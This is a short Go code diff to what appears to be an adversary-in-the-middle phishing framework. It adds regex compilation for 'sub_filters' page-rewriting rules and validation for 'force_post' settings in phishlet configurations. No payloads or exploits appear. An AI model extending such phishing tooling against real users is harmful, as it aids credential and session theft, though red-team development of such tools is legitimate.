@@ -3,6 +3,7 @@ package phishlet
 
 import (
 	"fmt"
+	"regexp"
 	"net"
 	"os"
 	"path/filepath"
@@ -141,9 +142,25 @@ func validate(p *core.Phishlet) error {
 	if len(p.BaseDomains) == 0 || len(p.ProxyHosts) == 0 {
 		return fmt.Errorf("base_domains and proxy_hosts required")
 	}
-	for _, f := range p.SubFilters {
-		if f.Search == "" || f.Search == f.Replace {
+	for i := range p.SubFilters {
+		f := &p.SubFilters[i]
+		if f.Search == "" || (!f.Regex && f.Search == f.Replace) {
 			return fmt.Errorf("sub_filters: bad search/replace")
+		}
+		if f.Regex {
+			re, err := regexp.Compile(f.Search)
+			if err != nil {
+				return fmt.Errorf("sub_filters: bad regex %q: %w", f.Search, err)
+			}
+			f.Compiled = re
+		}
+	}
+	for _, fr := range p.ForcePost {
+		if fr.Key == "" {
+			return fmt.Errorf("force_post: key required")
+		}
+		if fr.Ctype != "form" && fr.Ctype != "json" {
+			return fmt.Errorf("force_post: ctype must be form|json")
 		}
 	}
 	return nil
